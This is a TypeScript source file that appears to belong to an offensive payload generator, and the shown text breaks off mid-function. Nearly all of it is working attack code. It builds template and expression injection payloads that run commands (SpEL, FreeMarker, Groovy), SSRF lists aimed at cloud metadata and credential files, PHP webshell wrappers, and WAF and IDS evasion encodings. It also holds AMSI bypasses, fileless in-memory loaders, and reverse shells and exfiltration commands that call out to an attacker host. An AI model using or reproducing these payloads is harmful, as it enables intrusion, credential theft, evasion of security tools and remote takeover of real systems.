        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
        "X-Varnish": "12345678",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
      },
    ];
  }

  return base;
}

/* ═══════════════════════════════════════════════════════════════════════════
   SPRING EXPRESSION LANGUAGE (SpEL) INJECTION
   Targets Spring Framework, Spring Boot, Spring Security expression contexts
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildSpelPayloads(cmd: string): string[] {
  const e   = cmd.replace(/'/g, "\\'").replace(/"/g, '\\"');
  const b64c = b64(cmd);
  return [
    `${"\${"}T(java.lang.Runtime).getRuntime().exec('${e}')${"}"}`,
    `#{"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${e}")}`,
    `*{T(java.lang.Runtime).getRuntime().exec(new String(T(org.springframework.util.Base64Utils).decodeFromString('${b64c}')))}`,
    `${"\${"}T(java.lang.ProcessBuilder).new(new String[]{"/bin/bash","-c","${e}"}).start()${"}"}`,
    `${"\${"}T(java.lang.System).getenv()${"}"}`,
    `${"\${"}T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","${e}"})${"}"}`,
    `${"\${"}T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('${e}').getInputStream())${"}"}`,
    `#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('${e}').getInputStream()).useDelimiter('\\\\A').next()}`,
    `${"\${"}new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))${"}"}`,
    `${"\${"}T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'${e}')${"}"}`,
    `${"\${"}T(java.lang.Runtime).getRuntime().exec('id')${"}"}`,
    `__${"\${"}T(java.lang.Runtime).getRuntime().exec('${e}')${"}"}__`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   FREEMARKER TEMPLATE INJECTION
   Targets Apache FreeMarker — used by Spring MVC, Alfresco, Jenkins, Liferay
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildFreemarkerPayloads(cmd: string): string[] {
  const e = cmd.replace(/"/g, '\\"').replace(/'/g, "\\'");
  return [
    `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("${e}")}`,
    `[#assign ex = "freemarker.template.utility.Execute"?new()][#assign o = ex("${e}")]${"\${o}"}`,
    `<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${"\${dwf.newInstance(ec,null)(\"${e}\")}"}`,
    `<#assign uri=object?api.class.getResource("/")><#assign input=uri?api.toURI()?api.resolve("file:///etc/passwd")?api.toURL()?api.openStream()><#assign r=input?api.read(8192)>`,
    `<#assign walker=["freemarker.template.utility.Execute"]?new()>${"\${walker(\"${e}\")}"}`,
    `<#list "freemarker.template.utility.Execute"?new()("${e}")?split("\\n") as line>${"\${line}"}</#list>`,
    `<#assign s = "freemarker.template.utility.Execute"?new()><#assign result = s("${e}")>${"\${result}"}`,
    `<#attempt><#assign s="freemarker.template.utility.Execute"?new()>${"\${s(\"${e}\")"}<#recover></#attempt>`,
    `${"${\"freemarker.template.utility.Execute\"?new()(\"${e}\")}"}`,
    `<#setting locale="en_US"><#assign ex="freemarker.template.utility.Execute"?new()>${"\${ex(\"${e}\")}"}`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   GROOVY SCRIPT INJECTION
   Targets Jenkins Script Console, Grails, Gradle build scripts, Groovy Console
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildGroovyPayloads(cmd: string): string[] {
  const e   = cmd.replace(/"/g, '\\"').replace(/'/g, "\\'");
  const b64c = b64(cmd);
  return [
    `"${e}".execute().text`,
    `def c = "${e}".execute(); c.waitFor(); c.text`,
    `['bash','-c','${e}'].execute().text`,
    `['/bin/sh','-c','${e}'].execute().text`,
    `def p = new ProcessBuilder(["/bin/sh","-c","${e}"]).redirectErrorStream(true).start(); p.inputStream.text`,
    `def cmd="${e}"; def proc=cmd.execute(); proc.waitFor(); proc.text`,
    `new GroovyShell().evaluate("'${e}' as GString")`,
    `Runtime.runtime.exec("${e}").text`,
    `this.class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("${e}").text`,
    `new String("${e}".execute().in.bytes)`,
    `groovy.util.Eval.me("'${e}'.execute().text")`,
    `[cmd:['bash','-c','${e}'],env:System.getenv()].cmd.execute().text`,
    `def b=new String(Base64.decoder.decode('${b64c}')); b.execute().text`,
    `println "cmd /c ${e}".execute().text`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   SSRF PAYLOAD CHAINS — internal service pivoting and credential theft
   Targets: cloud IMDS, localhost services (Redis, Memcached, Elasticsearch),
   internal admin panels, Kubernetes API, Docker socket
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildSsrfPayloads(cmd: string): string[] {
  return [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:6379/config%20get%20*",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "gopher://127.0.0.1:6379/_SLAVEOF%20127.0.0.1%206379%0d%0a",
    "dict://127.0.0.1:11211/stat",
    "dict://127.0.0.1:11211/slabs",
    "http://127.0.0.1:9200/_cat/indices",
    "http://127.0.0.1:9200/_cluster/health",
    "http://127.0.0.1:8500/v1/kv/?recurse",
    "http://127.0.0.1:2375/containers/json",
    "http://127.0.0.1:2375/info",
    "http://127.0.0.1:10250/pods",
    "http://127.0.0.1:10255/pods",
    "https://kubernetes.default.svc/api/v1/pods",
    "http://127.0.0.1:8080/actuator/env",
    "http://127.0.0.1:8080/actuator/heapdump",
    "http://127.0.0.1:4040/api/tunnels",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
    "http://[::1]/",
    "http://0177.0.0.1/",
    "http://0x7f000001/",
    `http://127.0.0.1:80/?${cmd}`,
    `gopher://127.0.0.1:6379/_SET%20cmd%20"\n\n*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/attacker/4444%200>&1\n\n"\r\nCONFIG%20SET%20dir%20/var/spool/cron/\r\nCONFIG%20SET%20dbfilename%20root\r\nSAVE\r\n`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   PHP WRAPPER INJECTION — stream wrappers for LFI/RFI/RCE escalation
   Targets PHP apps using include/require on user-controlled input
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildPhpWrapperPayloads(cmd: string): string[] {
  const b64webshell = b64(`<?php system($_GET['c']); ?>`);
  const b64cmd      = b64(`<?php system('${cmd.replace(/'/g, "\\'")}'); ?>`);
  const b64proc     = b64(`<?php $d=proc_open('${cmd.replace(/'/g,"\\'")}',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p);echo stream_get_contents($p[1]);?>`);
  return [
    `php://filter/convert.base64-encode/resource=/etc/passwd`,
    `php://filter/read=string.rot13/resource=/etc/passwd`,
    `php://filter/read=convert.base64-encode/resource=index.php`,
    `php://filter/read=convert.base64-encode|convert.base64-encode/resource=/etc/passwd`,
    `php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd`,
    `data://text/plain;base64,${b64cmd}`,
    `data://text/plain,<?php system('${cmd.replace(/'/g,"\\'")}'); ?>`,
    `expect://${cmd}`,
    `php://input`,
    `phar://./uploads/shell.phar/shell.php`,
    `zip://uploads/shell.zip#shell.php`,
    `compress.zlib://http://attacker.com/shell.php`,
    `php://filter/convert.base64-decode/resource=data://text/plain,${b64webshell}`,
    `data://text/plain;base64,${b64webshell}`,
    `data://text/plain;base64,${b64proc}`,
    `php://filter/read=convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=/etc/passwd`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   MULTI-LAYER ENCODING CHAINS — bypass WAFs that decode only once
   Combinations: URL+URL, URL+HTML, B64+URL, Unicode+URL, hex+B64, etc.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildEncodingChains(payload: string): string[] {
  const u1  = urlEnc(payload);
  const u2  = dblUrlEnc(payload);
  const b   = b64(payload);
  const bU  = b64url(payload);
  const h   = hexEsc(payload);
  const rh  = rawHex(payload);
  const html = htmlEnc(payload);
  const rev  = payload.split("").reverse().join("");
  const revB = b64(rev);

  return [
    u1,
    u2,
    urlEnc(b64(payload)),
    urlEnc(urlEnc(payload)),
    htmlEnc(urlEnc(payload)),
    urlEnc(htmlEnc(payload)),
    b64(urlEnc(payload)),
    b64url(urlEnc(payload)),
    `${u2.replace(/%25/g, "%2525")}`,
    `${payload.replace(/[a-zA-Z]/g, c => `%${c.charCodeAt(0).toString(16).padStart(2,"0")}`)}`,
    `${payload.replace(/[a-zA-Z]/g, c => `%u00${c.charCodeAt(0).toString(16).padStart(2,"0")}`)}`,
    `${payload.replace(/./g, c => `&#${c.charCodeAt(0)};`)}`,
    `${payload.replace(/./g, c => `&#x${c.charCodeAt(0).toString(16)};`)}`,
    `${b64(b64(payload))}`,
    `${b64(b64(b64(payload)))}`,
    urlEnc(b64(b64(payload))),
    `${rh.replace(/(..)(?!$)/g, "$1%")}`,
    rev,
    urlEnc(rev),
    `${b64(rev)}`,
    urlEnc(revB),
  ].filter(s => s !== payload);
}

/* ═══════════════════════════════════════════════════════════════════════════
   HTTP PARAMETER POLLUTION — duplicate params to confuse WAF vs app parsing
   WAF reads first value; app reads last (or aggregated). Inject in the gap.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildParameterPollution(param: string, payload: string): string[] {
  const safe = "1";
  const enc  = encodeURIComponent(payload);
  return [
    `${param}=${safe}&${param}=${enc}`,
    `${param}=${enc}&${param}=${safe}`,
    `${param}[]=${safe}&${param}[]=${enc}`,
    `${param}[0]=${safe}&${param}[1]=${enc}`,
    `${param}=${safe};${param}=${enc}`,
    `${param}=${safe}%26${param}=${enc}`,
    `${param}=${safe}%0a${param}=${enc}`,
    `${param}[safe]=${safe}&${param}[inject]=${enc}`,
    `${param}%00=${safe}&${param}=${enc}`,
    `${param}=${safe},%20${enc}`,
  ];
}

export function buildContextPayloads(
  cmd:         string,
  os:          "windows" | "linux" | "unknown",
  waf:         string | null,
  language:    string,
  attackerIp  = "127.0.0.1",
  attackerPort = "4444",
): string[] {
  const set: string[] = [];
  const lang = language.toLowerCase();

  if (!waf) {
    if (os === "windows") {
      set.push(`& ${cmd}`, `| ${cmd}`, `\r\n${cmd}`, `%0a${cmd}`, `%0d%0a${cmd}`);
    } else {
      set.push(cmd, `;${cmd}`, `$(${cmd})`, `&&${cmd}`, `|${cmd}`, `\`${cmd}\``, `{ ${cmd}; }`, `\n${cmd}\n`);
    }
  }

  if (waf) {
    const wafVariants = buildWafBypass(cmd).split("\n").filter(Boolean).slice(0, 25);
    set.push(...wafVariants);
    const specificHdrs = buildWafSpecificHeaders(waf);
    if (specificHdrs.length) {
      const wafDirect = applyQuantumBypass(cmd, "ifs");
      set.push(wafDirect);
    }
  }

  if (os === "windows") {
    set.push(...buildWindowsPayloads(cmd));
    set.push(...buildWindowsTimingPayloads(7));
    set.push(...buildWindowsReverseShells(attackerIp, attackerPort).slice(0, 5));
  } else {
    set.push(...buildTimingPayloads(7).slice(0, 10));
    set.push(...buildStealthPayloads(cmd).slice(0, 12));
    if (os === "linux") {
      set.push(...buildReverseShells(attackerIp, attackerPort).slice(0, 6));
      set.push(...buildAntiForensicsPayloads(cmd).slice(0, 4));
    }
  }

  if (lang.includes("java")) {
    set.push(...buildSSTIPayloads(cmd).slice(0, 5));
    set.push(...buildLog4ShellPayloads(attackerIp, attackerPort).slice(0, 6));
    set.push(...buildSpelPayloads(cmd).slice(0, 5));
    set.push(...buildGroovyPayloads(cmd).slice(0, 5));
    set.push(...buildFreemarkerPayloads(cmd).slice(0, 4));
  }

  if (lang.includes("php")) {
    const q = cmd.replace(/'/g, "\\'");
    set.push(
      `; system('${q}');`,
      `; passthru('${q}');`,
      `; shell_exec('${q}');`,
      `; exec('${q}', $o); echo implode("\\n",$o);`,
      `; echo popen('${q}','r');`,
      `; proc_close(proc_open('${q}',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p));`,
      ...buildPhpWrapperPayloads(cmd).slice(0, 6),
    );
  }

  if (lang.includes("python")) {
    const q = cmd.replace(/'/g, "\\'");
    set.push(
      `; __import__('os').system('${q}')`,
      `; __import__('subprocess').check_output(['sh','-c','${q}'],stderr=-2).decode()`,
      `; __import__('os').popen('${q}').read()`,
      `{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('${q}').read()}}`,
    );
    set.push(...buildSSTIPayloads(cmd).slice(0, 4));
  }

  if (lang.includes("ruby")) {
    const q = cmd.replace(/'/g, "\\'");
    set.push(
      `; \`${cmd}\``,
      `; system('${q}')`,
      `; exec('${q}')`,
      `; IO.popen('${q}').read`,
      `<%= \`${cmd}\` %>`,
      `<%= system('${q}') %>`,
    );
  }

  if (lang.includes(".net") || lang.includes("asp")) {
    set.push(
      `; System.Diagnostics.Process.Start("cmd", "/c ${cmd.replace(/"/g, '\\"')}");`,
      `<%= new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c ${cmd.replace(/"/g, '\\"')}"){ UseShellExecute=false,RedirectStandardOutput=true}}.Start() %>`,
    );
  }

  if (lang.includes("node") || lang.includes("express")) {
    const q = cmd.replace(/"/g, '\\"');
    set.push(
      `; require('child_process').execSync('${cmd.replace(/'/g, "\\'")}').toString()`,
      `; require("child_process").execSync("${q}",{stdio:"pipe"}).toString()`,
      `{{constructor.constructor('return require("child_process").execSync("${q}").toString()')()}}`,
    );
  }

  set.push(...buildSsrfPayloads(cmd).slice(0, 6));
  set.push(...buildXXEPayloads(attackerIp, attackerPort).slice(0, 4));

  return [...new Set(set)].filter(Boolean);
}


  /* ═══════════════════════════════════════════════════════════════════════
     LENGTH-OPTIMIZED PAYLOADS  (for targets with strict input limits)
     ═══════════════════════════════════════════════════════════════════════ */

  /** Returns payloads sorted ascending by byte length. Pass maxLen to filter. */
  export function buildLengthOptimizedPayloads(cmd: string, maxLen?: number): string[] {
    const c = cmd.trim();
    const all: string[] = [
      // ≤ 8 chars (requires server to already know the command)
      ";id",
      "|id",
      "`id`",
      ";ls",
      "|ls",
      // ≤ 15 chars
      ";id;",
      "||id",
      "&&id",
      ";id #",
      "|id #",
      // Short heredoc
      "<<'EOF'\nEOF",
      // IFS trick (cmd must be 1 word)
      ...(c.indexOf(" ") === -1 ? ["${IFS}" + c] : []),
      // Brace group — very short eval
      "{" + c + "}",
      // Backtick no-spaces
      ...(c.indexOf(" ") === -1 ? ["`" + c + "`"] : []),
      // Dollar-paren no-spaces
      ...(c.indexOf(" ") === -1 ? ["$(" + c + ")"] : []),
      // ; separator
      ";" + c,
      // pipe
      "|" + c,
      // or-gate
      "||" + c,
      // and-gate
      "&&" + c,
      // newline
      "\n" + c,
      // null-byte separator
      "\x00" + c,
      // comment bypass
      "#\n" + c,
      // CR bypass
      "\r\n" + c,
      // semicolon + space variations
      "; " + c,
      " ; " + c,
      "| " + c,
      " | " + c,
      "&& " + c,
      // env-var IFS substitution
      c.replace(/ /g, "${IFS}"),
      // Tab substitution
      c.replace(/ /g, "\t"),
      // $@ between chars (bash)
      c.split("").join("$@"),
      // printf eval (compact)
      "$(printf '" + c.replace(/'/g, "'\''") + "')",
    ];

    const sorted = [...new Set(all)].sort((a, b) => a.length - b.length);
    return maxLen !== undefined ? sorted.filter(p => p.length <= maxLen) : sorted;
  }

  /* ═══════════════════════════════════════════════════════════════════════
     ADAPTIVE PAYLOADS  (tool-aware — only emit payloads for present tools)
     ═══════════════════════════════════════════════════════════════════════ */

  /** Build payloads adapted to the available tools detected on the target.
   *  Pass the list from targetProbe.ts probeAvailableTools().
   *  Only emits payload variants that use binaries confirmed present,
   *  dramatically reducing noise and maximising per-request hit rate.
   */
  export function buildAdaptivePayloads(cmd: string, tools: string[]): string[] {
    const t    = new Set(tools.map(x => x.trim().toLowerCase()));
    const has  = (name: string): boolean => t.has(name);
    const set: string[] = [];
    const q  = cmd.replace(/'/g, "\\'");
    const qd = cmd.replace(/"/g, '\\"');

    /* ── Shell execution primitives ── */
    if (has("bash")) {
      set.push(
        `;${cmd}`,
        `&&${cmd}`,
        `|${cmd}`,
        `;bash -c '${q}'`,
        `;bash<<<'${q}'`,
        `\`${cmd}\``,
        `$(${cmd})`,
      );
    } else if (has("sh")) {
      set.push(`;${cmd}`, `&&${cmd}`, `|${cmd}`, `;sh -c '${q}'`);
    } else if (has("zsh")) {
      set.push(`;zsh -c '${q}'`);
    } else if (has("fish")) {
      set.push(`;fish -c '${q}'`);
    }

    /* ── High-level interpreters ── */
    if (has("python3")) {
      set.push(`;python3 -c "__import__('os').system('${q}')"`,
               `;python3 -c "import subprocess;subprocess.run(['sh','-c','${q}'])"`);
    } else if (has("python")) {
      set.push(`;python -c "__import__('os').system('${q}')"`,
               `;python -c "import subprocess;subprocess.call(['sh','-c','${q}'])"`);
    }
    if (has("perl")) {
      set.push(`;perl -e "system('${q}')"`,
               `;perl -e "use POSIX;system('${q}')"`);
    }
    if (has("ruby")) {
      set.push(`;ruby -e "system('${q}')"`,
               `;\`${cmd}\``);
    }
    if (has("php")) {
      set.push(`;php -r "system('${q}');"`,
               `;php -r "passthru('${q}');"`);
    }
    if (has("node") || has("nodejs")) {
      set.push(`;node -e "require('child_process').execSync('${q}',{stdio:'inherit'})"`,
               `;node -e "require('child_process').execFileSync('/bin/sh',['-c','${q}'],{stdio:'pipe'}).toString()"`);
    }
    if (has("lua")) {
      set.push(`;lua -e "os.execute('${q}')"`,
               `;lua5.3 -e "os.execute('${q}')"`);
    }
    if (has("tclsh")) {
      set.push(`;tclsh <<'__TCL__'\nexec ${cmd}\n__TCL__`);
    }
    if (has("awk")) {
      set.push(`;awk 'BEGIN{system("${qd}")}'`);
    }

    /* ── Encoding-based execution (needs base64 + a shell) ── */
    if (has("base64") && (has("bash") || has("sh"))) {
      const b  = Buffer.from(cmd).toString("base64");
      const sh = has("bash") ? "bash" : "sh";
      set.push(
        `;${sh}<<<$(echo${IFS}${b}|base64${IFS}-d)`,
        `;echo${IFS}${b}|base64${IFS}-d|${sh}`,
        `;{echo,${b}}|{base64,-d}|${sh}`,
      );
    }
    if (has("openssl") && (has("bash") || has("sh"))) {
      const b  = Buffer.from(cmd).toString("base64");
      const sh = has("bash") ? "bash" : "sh";
      set.push(`;echo${IFS}${b}|openssl${IFS}enc${IFS}-d${IFS}-base64|${sh}`);
    }
    if (has("xxd") && (has("bash") || has("sh"))) {
      const rhx = Buffer.from(cmd).toString("hex");
      const sh  = has("bash") ? "bash" : "sh";
      set.push(`;echo${IFS}${rhx}|xxd${IFS}-r${IFS}-p|${sh}`);
    }

    /* ── Exfil / OOB channels ── */
    if (has("curl")) {
      set.push(
        `;curl -sk "http://$(${cmd}|base64 -w0).leak/" 2>/dev/null`,
        `;_R=$(${cmd}${IFS}2>&1);curl -sk "http://localhost/?x=$(printf '%s' "$_R"|base64 -w0|head -c200)" 2>/dev/null`,
      );
    }
    if (has("wget")) {
      set.push(
        `;wget -qO- "http://localhost/?x=$(${cmd}|base64 -w0)" 2>/dev/null`,
        `;_R=$(${cmd}${IFS}2>&1);wget -qO/dev/null "http://localhost/?d=$(printf '%s' "$_R"|base64 -w0|head -c200)" 2>/dev/null`,
      );
    }

    /* ── Reverse-shell shortcuts (needs nc/ncat/socat on target) ── */
    if (has("ncat")) {
      set.push(`;ncat -e /bin/sh localhost 4444 2>/dev/null &`);
    } else if (has("nc") || has("netcat")) {
      set.push(
        `;nc -e /bin/sh localhost 4444 2>/dev/null &`,
        `;rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc localhost 4444>/tmp/f 2>/dev/null &`,
      );
    }
    if (has("socat")) {
      set.push(`;socat exec:'/bin/sh -i',pty,stderr tcp:localhost:4444 2>/dev/null &`);
    }

    /* ── printf hex eval (always available if printf exists) ── */
    if (has("printf")) {
      const hex = [...Buffer.from(cmd)].map((b: number) => `\\x${b.toString(16).padStart(2,"0")}`).join("");
      const sh  = has("bash") ? "bash" : has("sh") ? "sh" : null;
      if (sh) set.push(`;$(printf${IFS}'${hex}')`);
    }

    /* ── GNU coreutils execution vectors ── */
    if (has("sed")) {
      set.push(`;sed -n 'e ${cmd}' /dev/null 2>/dev/null`);
    }
    if (has("find")) {
      const parts = cmd.split(" ");
      set.push(`;find /tmp -maxdepth 0 -exec ${parts[0]} ${parts.slice(1).join(" ")} \\; 2>/dev/null`);
    }
    if (has("xargs") && (has("bash") || has("sh"))) {
      set.push(`;echo ${JSON.stringify(cmd)} | xargs -I% sh -c "%" 2>/dev/null`);
    }
    if (has("tee") && (has("bash") || has("sh"))) {
      set.push(`;echo ${JSON.stringify(cmd)} | tee /dev/stderr | sh 2>/dev/null`);
    }
    if (has("dd") && (has("bash") || has("sh"))) {
      set.push(`;dd if=/dev/stdin of=/tmp/.nx bs=1 count=${cmd.length} <<< ${JSON.stringify(cmd)} 2>/dev/null && sh /tmp/.nx; rm -f /tmp/.nx`);
    }

    /* ── Universal fallbacks (no tool check needed) ── */
    set.push(`;${cmd}`, `\n${cmd}`, `${IFS}${cmd}`, `||${cmd}`, `&&${cmd}`);
    /* Always add base64-encoded eval as last-resort (no tool dependency on fallback) */
    set.push(`eval "$(printf '${hexEsc(cmd)}')" 2>/dev/null`);
    set.push(`{ ${cmd}; } 2>&1`);
    set.push(`( ${cmd} ) 2>&1`);

    return [...new Set(set)].filter(p => p.trim().length > 1);
  }

/* ═══════════════════════════════════════════════════════════════════════════
   POLYMORPHIC PAYLOAD GENERATOR
   Produces a different obfuscated variant on every call — no two requests
   carry the same byte sequence, defeating static WAF/IDS signatures.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildPolymorphicPayload(cmd: string, bypassMode = "quantum"): string {
  const raw = cmd.trim();
  const B64 = b64(raw);
  const HEX = hexEsc(raw);
  const RHX = rawHex(raw);

  // Random count of junk variable assignments (3–7)
  const junkCount = 3 + Math.floor(Math.random() * 5);
  const junkParts: string[] = [];
  for (let j = 0; j < junkCount; j++) {
    const vn = varName();
    const pick = j % 4;
    if (pick === 0)      junkParts.push(`${vn}=${rnd()}`);
    else if (pick === 1) junkParts.push(`${vn}=$((${rnd(1,99)}*${rnd(1,99)}))`);
    else if (pick === 2) junkParts.push(`${vn}=$(date +%s 2>/dev/null||echo ${rnd()})`);
    else                 junkParts.push(`${vn}="${rnd()}${rnd()}"`);
  }
  const junk = junkParts.join(";");

  // Pick a random encoding strategy for this call
  const encoders: Array<() => string> = [
    () => `{echo,${B64}}|{base64,-d}|bash`,
    () => `eval "$(printf '${HEX}')"`,
    () => `bash<<<$(echo${TAB}${B64}|base64${TAB}-d)`,
    () => `python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"`,
    () => `perl -e "system(pack('H*','${RHX}'))"`,
    () => `node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"`,
    () => `ruby -e "require 'base64';system(Base64.decode64('${B64}'))"`,
    () => `echo ${RHX}|xxd -r -p|bash`,
  ];
  const enc = encoders[Math.floor(Math.random() * encoders.length)]!();

  // Splice the junk+encoding block into a random position of the base payload
  const base  = applyQuantumBypass(cmd, bypassMode);
  const parts = base.split("||");
  const pos   = 1 + Math.floor(Math.random() * Math.max(1, parts.length - 1));
  parts.splice(pos, 0, `{ ${junk};${enc}; } 2>/dev/null`);
  return parts.join("||");
}

/* ═══════════════════════════════════════════════════════════════════════════
   AMSI BYPASS PAYLOADS  (Windows / PowerShell)
   Techniques that disable or patch AMSI before the real payload executes.
   Use as a pre-stage before sending your PowerShell payload.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildAmsiBypassPayloads(): string[] {
  return [
    // Reflection — set amsiInitFailed = true (classic, still works on unpatched PS)
    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
    // String-split obfuscation to evade static analysis
    `$a='Am'+'siU'+'tils';$b=[Ref].Assembly.GetType('System.Management.Automation.'+$a);$b.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true)`,
    // Add-Type VirtualProtect patch (overwrites AmsiScanBuffer stub with ret 0)
    `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxPatch{[DllImport("k"+"ernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("k"+"ernel32")]public static extern IntPtr LoadLibrary(string l);[DllImport("k"+"ernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Go(){uint o;IntPtr h=LoadLibrary("ams"+"i.dll");IntPtr f=GetProcAddress(h,"Amsi"+"ScanBuffer");VirtualProtect(f,(UIntPtr)5,0x40,out o);System.Runtime.InteropServices.Marshal.Copy(new byte[]{0x31,0xC0,0xC3,0x90,0x90},0,f,5);}}'; [NxPatch]::Go()`,
    // PowerShell v2 downgrade (no AMSI in PS 2.0)
    `powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -Command`,
    // WMI execution bypass (spawns new process context without AMSI hooks)
    `([wmiclass]'win32_process').Create("powershell -nop -ep bypass -e {B64CMD}")`,
    // EnvVar-based bypass (breaks signature scanning context)
    `$env:PSExecutionPolicyPreference='bypass';$e=[System.Text.Encoding]::Unicode;$d=[System.Convert]::FromBase64String`,
    // Bypass via COM object (MshtmlHost)
    `$c=New-Object -COM 'MsHtml.HtmlDocument';$c.GetType().InvokeMember('scripts','GetProperty',$null,$c,$null)`,
    // ScriptBlock logging disable via reflection
    `[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp');$t=[System.Management.Automation.PSParser].Assembly.GetType('System.Management.Automation.Security.SystemPolicy');$f=$t.GetField('cachedSystemLockdownPolicy','NonPublic,Static');if($f){$f.SetValue($null,-1)}`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   FILELESS / IN-MEMORY EXECUTION PAYLOADS  (Linux)
   Execute code entirely from RAM — no binary written to disk.
   Useful for EDR evasion on hardened Linux targets.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildMemfdPayloads(ip: string, port: string | number): string[] {
  return [
    // Python3 memfd_create — load and exec ELF from memory
    `python3 -c "import ctypes,os,socket;fd=ctypes.CDLL(None).memfd_create('',1);s=socket.socket();s.connect(('${ip}',${port}));d=b'';t=s.recv(65536);[d:=d+t for _ in iter(lambda:t,b'')];os.write(fd,d);os.execv('/proc/self/fd/'+str(fd),['x'])" 2>/dev/null`,
    // Perl syscall 319 (memfd_create) wrapper
    `perl -e 'use POSIX;$fd=syscall(319,"x",1);open my$f,">&=",$fd;print$f \`curl -sk http://${ip}:${port}/x\`;exec{"/proc/self/fd/$fd"}("x")' 2>/dev/null`,
    // /dev/shm tmpfs — volatile memory filesystem (no disk flush under normal ops)
    `T=$(mktemp -p /dev/shm 2>/dev/null||mktemp -p /run/shm 2>/dev/null||mktemp);curl -sk http://${ip}:${port}/x>$T;chmod +x $T;$T;rm -f $T 2>/dev/null`,
    // Pure in-process Python reverse shell (no child process, no file)
    `python3 -c "import socket,os;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),i) for i in range(3)];__import__('subprocess').call(['/bin/sh','-i'])" 2>/dev/null`,
    // LD_PRELOAD shared library via /dev/shm (injected, not saved persistently)
    `curl -sk http://${ip}:${port}/l.so -o /dev/shm/.l.so 2>/dev/null && LD_PRELOAD=/dev/shm/.l.so /bin/ls 2>/dev/null; rm -f /dev/shm/.l.so`,
    // Bash + /proc/self/fd trick (open FD, write payload, exec via /proc)
    `exec 9<>/dev/tcp/${ip}/${port} 2>/dev/null;cat <&9>/dev/shm/.x 2>/dev/null;chmod +x /dev/shm/.x;/dev/shm/.x;rm /dev/shm/.x 2>/dev/null`,
    // Node.js Buffer-based in-memory eval (no fs.write)
    `node -e "const c=require('child_process'),h=require('http');h.get('http://${ip}:${port}/p.js',r=>{let b='';r.on('data',d=>b+=d);r.on('end',()=>eval(b))})" 2>/dev/null`,
  ];
}
  

/* ═══════════════════════════════════════════════════════════════════════════
   JNDI INJECTION VARIANTS  — all protocols + obfuscation layers
   Covers Log4Shell (CVE-2021-44228), Spring4Shell adjacent, plus 2024/2025
   JNDI sinks in third-party Java libraries still commonly deployed.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildJndiVariants(attackerHost: string, attackerPort: string | number): string[] {
  const h   = attackerHost;
  const p   = String(attackerPort);
  const rid = () => Math.random().toString(36).slice(2, 8);
  const path = `/Exploit${rid()}`;

  /* Unicode escapes that bypass naive ${} string filter */
  const uc = (s: string): string => [...s].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
  const lo = (s: string): string => s.split("").map((c,i) => i%2===0?c.toUpperCase():c).join("");

  const base: string[] = [
    /* standard protocols */
